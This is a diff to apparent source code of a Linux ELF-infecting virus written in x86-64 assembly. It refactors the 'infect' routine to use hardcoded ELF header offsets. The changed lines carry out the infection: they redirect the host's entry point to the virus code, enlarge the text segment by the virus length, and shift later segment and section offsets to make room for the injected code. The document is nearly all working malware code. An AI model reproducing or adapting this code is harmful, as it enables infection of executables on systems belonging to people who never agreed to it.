@@ -141,8 +141,8 @@ BITS 64
 ; https://www.guitmz.com/linux-nasty-elf-virus/ 
 ;  
 ;*******************************************************************************
-
-section	.bss
+;
+;section	.bss
 ;	struc linuxdirent
 ;		.d_ino:			resq	1
 ;		.d_off:			resq	1
@@ -193,30 +193,30 @@ section	.bss
 ;		.e_shstrndx		resb	2		;uint16_t, bytes 62-63
 ;	endstruc
 
-	struc elf_phdr
-		.p_type			resd 1		;  uint32_t   
-		.p_flags		resd 1		;  uint32_t   
-		.p_offset		resq 1		;  Elf64_Off  
-		.p_vaddr		resq 1		;  Elf64_Addr 
-		.p_paddr		resq 1		;  Elf64_Addr 
-		.p_filesz		resq 1		;  uint64_t   
-		.p_memsz		resq 1		;  uint64_t   
-		.p_align		resq 1		;  uint64_t   
-	endstruc
-
-	struc elf_shdr
-    	.sh_name		resd 1		; uint32_t   
-    	.sh_type		resd 1		; uint32_t   
-    	.sh_flags		resq 1		; uint64_t   
-    	.sh_addr		resq 1		; Elf64_Addr 
-     	.sh_offset		resq 1		; Elf64_Off  
-     	.sh_size		resq 1		; uint64_t   
-     	.sh_link		resd 1		; uint32_t   
-     	.sh_info		resd 1		; uint32_t   
-     	.sh_addralign	resq 1		; uint64_t   
-     	.sh_entsize		resq 1		; uint64_t   
-	endstruc
-
+;	struc elf_phdr
+;		.p_type			resd 1		;  uint32_t   
+;		.p_flags		resd 1		;  uint32_t   
+;		.p_offset		resq 1		;  Elf64_Off  
+;		.p_vaddr		resq 1		;  Elf64_Addr 
+;		.p_paddr		resq 1		;  Elf64_Addr 
+;		.p_filesz		resq 1		;  uint64_t   
+;		.p_memsz		resq 1		;  uint64_t   
+;		.p_align		resq 1		;  uint64_t   
+;	endstruc
+;
+;	struc elf_shdr
+;    	.sh_name		resd 1		; uint32_t   
+;    	.sh_type		resd 1		; uint32_t   
+;    	.sh_flags		resq 1		; uint64_t   
+;    	.sh_addr		resq 1		; Elf64_Addr 
+;     	.sh_offset		resq 1		; Elf64_Off  
+;     	.sh_size		resq 1		; uint64_t   
+;     	.sh_link		resd 1		; uint32_t   
+;     	.sh_info		resd 1		; uint32_t   
+;     	.sh_addralign	resq 1		; uint64_t   
+;     	.sh_entsize		resq 1		; uint64_t   
+;	endstruc
+;
 ;*******************************************************************************
 ; stacks on stacks on stacks on I'm doing this bc a .bss section for a virus
 ; is a nightmare to deal with
@@ -308,9 +308,26 @@ section	.bss
 ; r14 + elf_ehdr.e_phoff + 16		.p_vaddr		resq 1		;  Elf64_Addr 
 ; r14 + elf_ehdr.e_phoff + 24		.p_paddr		resq 1		;  Elf64_Addr 
 ; r14 + elf_ehdr.e_phoff + 32		.p_filesz		resq 1		;  uint64_t   
-; r14 + elf_ehdr.e_phoff + 48		.p_memsz		resq 1		;  uint64_t   
-; r14 + elf_ehdr.e_phoff + 56		.p_align		resq 1		;  uint64_t   
-; r14 + elf_ehdr.e_phoff + 64	endstruc
+; r14 + elf_ehdr.e_phoff + 40		.p_memsz		resq 1		;  uint64_t   
+; r14 + elf_ehdr.e_phoff + 48		.p_align		resq 1		;  uint64_t   
+; r14 + elf_ehdr.e_phoff + 56	endstruc
+;
+;
+;Same breakdown of offsets for the ELF Section Headers:
+;
+; r14 + elf_ehdr.e_shoff + 0	struc elf_shdr
+; r14 + elf_ehdr.e_shoff + 0		.sh_name		resd 1		;  uint32_t   
+; r14 + elf_ehdr.e_shoff + 4		.sh_type		resd 1		;  uint32_t   
+; r14 + elf_ehdr.e_shoff + 8		.sh_flags		resq 1		;  uint64_t   
+; r14 + elf_ehdr.e_shoff + 16		.sh_addr		resq 1		;  Elf64_Addr 
+; r14 + elf_ehdr.e_shoff + 24		.sh_offset		resq 1		;  Elf64_Off  
+; r14 + elf_ehdr.e_shoff + 32		.sh_size		resq 1		;  uint64_t   
+; r14 + elf_ehdr.e_shoff + 40    	.sh_link		resd 1		; uint32_t   
+; r14 + elf_ehdr.e_shoff + 44		.sh_info		resd 1		; uint32_t   
+; r14 + elf_ehdr.e_shoff + 48		.sh_addralign	resq 1		; uint64_t   
+; r14 + elf_ehdr.e_shoff + 56		.sh_entsize		resq 1		; uint64_t   
+; r14 + elf_ehdr.e_shoff + 64	endstruc
+
 
 section .data
 
@@ -908,6 +925,17 @@ infect:
 ;	r12 contains *offset* within mmap'ed file to PHdr
 ;	we need to increment r12 on each iteration (where # of iterations == elf_ehdr.e_phnum)
 ;
+; r14 + elf_ehdr.e_phoff + 0	struc elf_phdr
+; r14 + elf_ehdr.e_phoff + 0		.p_type			resd 1		;  uint32_t   
+; r14 + elf_ehdr.e_phoff + 4		.p_flags		resd 1		;  uint32_t   
+; r14 + elf_ehdr.e_phoff + 8		.p_offset		resq 1		;  Elf64_Off  
+; r14 + elf_ehdr.e_phoff + 16		.p_vaddr		resq 1		;  Elf64_Addr 
+; r14 + elf_ehdr.e_phoff + 24		.p_paddr		resq 1		;  Elf64_Addr 
+; r14 + elf_ehdr.e_phoff + 32		.p_filesz		resq 1		;  uint64_t   
+; r14 + elf_ehdr.e_phoff + 40		.p_memsz		resq 1		;  uint64_t   
+; r14 + elf_ehdr.e_phoff + 48		.p_align		resq 1		;  uint64_t   
+; r14 + elf_ehdr.e_phoff + 56	endstruc
+;
 ;****************************************************************************************
 	xor rcx, rcx
 	xor r11, r11
@@ -916,7 +944,8 @@ infect:
 	check_phdrs:
 		.phdr_loop:
 			push rcx
-			cmp word [r13 + r12 + elf_phdr.p_type], PT_LOAD			
+			;cmp word [r13 + r12 + elf_phdr.p_type], PT_LOAD			
+			cmp word [r13 + r12], PT_LOAD		;elf_phdr.p_type offset	
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
 				;mov rdx, checkptloadpasslen
@@ -924,9 +953,12 @@ infect:
 				;mov rdi, STDOUT
 				;mov rax, SYS_WRITE
 				;syscall
-				cmp dword [r13 + r12 + elf_phdr.p_flags], PFLAGS_RX
+				
+				;cmp dword [r13 + r12 + elf_phdr.p_flags], PFLAGS_RX
+				cmp dword [r13 + r12 + 4], PFLAGS_RX		;elf_phdr.p_flags offset
 				je .mod_phdr_text_segment			
-				cmp dword [r13 + r12 + elf_phdr.p_flags], PFLAGS_RW
+				;cmp dword [r13 + r12 + elf_phdr.p_flags], PFLAGS_RW
+				cmp dword [r13 + r12 + 4], PFLAGS_RW		;elf_phdr.p_flags offset
 				je .mod_phdr_data_segment			
 				;jne .mod_subsequent_phdr
 				jne .mod_other_ptload_phdr
@@ -937,19 +969,25 @@ infect:
 					;mov rax, SYS_WRITE
 					;syscall
 				
-					mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
-					add r10, [r13 + r12 + elf_phdr.p_filesz]
+					;mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
+					;add r10, [r13 + r12 + elf_phdr.p_filesz]
+					mov r10, [r13 + r12 + 16] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
+					add r10, [r13 + r12 + 32]	;elf_phdr.p_filesz offset
 					mov qword [evaddr], r10				;save evaddr
 					
 					;add dword r10d, ventry				;new entry point of infected file = evaddr + ventry
 					;mov qword [r13 + elf_ehdr.e_entry], r10	; update ELF header entry point to point to virus code start
 					mov qword [r13 + 24], r10	; update ELF header entry point to point to virus code start
-					mov r10, [r13 + r12 + elf_phdr.p_offset] 
+					;mov r10, [r13 + r12 + elf_phdr.p_offset] 
+					mov r10, [r13 + r12 + 8]			;elf_phdr.p_offset  
 					mov dword [hosttext_start], r10d
-					add r10, qword [r13 + r12 + elf_phdr.p_filesz]				
+					;add r10, qword [r13 + r12 + elf_phdr.p_filesz]				
+					add r10, [r13 + r12 + 32]	;elf_phdr.p_filesz offset
 					mov dword [vxoffset], r10d
-					add qword [r13 + r12 + elf_phdr.p_filesz], vlen	
-					add qword [r13 + r12 + elf_phdr.p_memsz], vlen
+					add qword [r13 + r12 + 32], vlen	;elf_phdr.p_filesz offset
+					add qword [r13 + r12 + 40], vlen	;elf_phdr.p_memsz offset
+					;add qword [r13 + r12 + elf_phdr.p_filesz], vlen	
+					;add qword [r13 + r12 + elf_phdr.p_memsz], vlen
 					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing	
 				.mod_phdr_data_segment:			
 					;mov rdx, checkphdrRWpasslen
@@ -957,11 +995,14 @@ infect:
 					;mov rdi, STDOUT
 					;mov rax, SYS_WRITE
 					;syscall
-					mov r11, [r13 + r12 + elf_phdr.p_offset]
+					
+					;mov r11, [r13 + r12 + elf_phdr.p_offset]
+					mov r11, [r13 + r12 + 8]			;elf_phdr.p_offset  
 					mov dword [data_offset_og],  r11d
 					mov qword [data_offset_original],  r11
 					add dword r11d, [PAGESIZE]
-					mov dword [r13 + r12 + elf_phdr.p_offset], r11d
+					;mov dword [r13 + r12 + elf_phdr.p_offset], r11d
+					mov dword [r13 + r12 + 8], r11d				;elf_phdr.p_offset
 					mov dword [data_offset_new_padding],  r11d
 					;mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
 					;add dword r10d, [PAGESIZE]
@@ -971,7 +1012,8 @@ infect:
 					;mov dword [r13 + r12 + elf_phdr.p_paddr], r10d
 					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing
 				.mod_other_ptload_phdr:
-					mov r11, [r13 + r12 + elf_phdr.p_offset]
+					;mov r11, [r13 + r12 + elf_phdr.p_offset]
+					mov r11, [r13 + r12 + 8]			;elf_phdr.p_offset  
 					cmp r11d, [vxoffset]
 					jl .next_phdr
 					mov r10, qword [intermediary_ptload_segment_offset]
@@ -984,11 +1026,14 @@ infect:
 				mov r11d, [vxoffset]
 				cmp r11d, 0
 				je .next_phdr
-				mov r11, [r13 + r12 + elf_phdr.p_offset]
+				;mov r11, [r13 + r12 + elf_phdr.p_offset]
+				mov r11, [r13 + r12 + 8]			;elf_phdr.p_offset  
 				cmp r11d, [vxoffset]
 				jl .next_phdr
 				add dword r11d, [PAGESIZE]
-				mov dword [r13 + r12 + elf_phdr.p_offset], r11d
+				;mov dword [r13 + r12 + elf_phdr.p_offset], r11d
+				mov dword [r13 + r12 + 8], r11d				;elf_phdr.p_offset
+				
 				;mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
 				;add dword r10d, [PAGESIZE]
 				;mov dword [r13 + r12 + elf_phdr.p_vaddr], r10d
@@ -1006,6 +1051,21 @@ infect:
 
 ;****************************************************************************************
 ;	Now update section headers of infected ELF
+;
+;
+; r14 + elf_ehdr.e_shoff + 0	struc elf_shdr
+; r14 + elf_ehdr.e_shoff + 0		.sh_name		resd 1		;  uint32_t   
+; r14 + elf_ehdr.e_shoff + 4		.sh_type		resd 1		;  uint32_t   
+; r14 + elf_ehdr.e_shoff + 8		.sh_flags		resq 1		;  uint64_t   
+; r14 + elf_ehdr.e_shoff + 16		.sh_addr		resq 1		;  Elf64_Addr 
+; r14 + elf_ehdr.e_shoff + 24		.sh_offset		resq 1		;  Elf64_Off  
+; r14 + elf_ehdr.e_shoff + 32		.sh_size		resq 1		;  uint64_t   
+; r14 + elf_ehdr.e_shoff + 40    	.sh_link		resd 1		; uint32_t   
+; r14 + elf_ehdr.e_shoff + 44		.sh_info		resd 1		; uint32_t   
+; r14 + elf_ehdr.e_shoff + 48		.sh_addralign	resq 1		; uint64_t   
+; r14 + elf_ehdr.e_shoff + 56		.sh_entsize		resq 1		; uint64_t   
+; r14 + elf_ehdr.e_shoff + 64	endstruc
+;
 ;****************************************************************************************
 	xor r10, r10
 	xor r11, r11
@@ -1021,7 +1081,8 @@ infect:
 		;syscall
 		.shdr_loop:
 			push rcx
-			mov r11, [r13 + r15 + elf_shdr.sh_offset]
+			;mov r11, [r13 + r15 + elf_shdr.sh_offset]
+			mov r11, [r13 + r15 + 24]							;elf_shdr.sh_offset
 			;cmp dword [r13 + r15 + elf_shdr.sh_offset], vxoffset
 			cmp dword r11d, [vxoffset]
 			jge .mod_subsequent_shdr
@@ -1033,17 +1094,22 @@ infect:
 				;mov rdi, STDOUT
 				;mov rax, SYS_WRITE
 				;syscall
-				mov r11, [r13 + r15 + elf_shdr.sh_addr]
+				
+				;mov r11, [r13 + r15 + elf_shdr.sh_addr]
+				mov r11, [r13 + r15 + 16]						;elf_shdr.sh_addr
 				;add dword r11d, [r13 + r15 + elf_shdr.sh_size]
-				add r11, qword [r13 + r15 + elf_shdr.sh_size]
+				;add r11, qword [r13 + r15 + elf_shdr.sh_size]
+				add r11, qword [r13 + r15 + 32]					;elf_shdr.sh_size
 				;cmp dword r11d, [vxoffset]
 				cmp r11, [evaddr]
 				jne .next_shdr
 				;jne .mod_subsequent_shdr
 			.mod_last_text_section_shdr:
-				mov r10, [r13 + r15 + elf_shdr.sh_size]
+				;mov r10, [r13 + r15 + elf_shdr.sh_size]
+				mov r10, [r13 + r15 + 32]						;elf_shdr.sh_size
 				add dword r10d, vlen
-				mov [r13 + r15 + elf_shdr.sh_size], r10
+				;mov [r13 + r15 + elf_shdr.sh_size], r10
+				mov [r13 + r15 + 32], r10						;elf_shdr.sh_size
 				jmp .next_shdr
 			.mod_subsequent_shdr:
 				;mov rdx, modsubsequentshdrlen
@@ -1051,9 +1117,11 @@ infect:
 				;mov rdi, STDOUT
 				;mov rax, SYS_WRITE
 				;syscall
-				mov r11, [r13 + r15 + elf_shdr.sh_offset]
+				;mov r11, [r13 + r15 + elf_shdr.sh_offset]
+				mov r11, [r13 + r15 + 24]							;elf_shdr.sh_offset
 				add dword r11d, [PAGESIZE]
-				mov dword [r13 + r15 + elf_shdr.sh_offset], r11d
+				;mov dword [r13 + r15 + elf_shdr.sh_offset], r11d
+				mov dword [r13 + r15 + 24], r11d					;elf_shdr.sh_offset
 		.next_shdr:
 			pop rcx
 			dec cx 
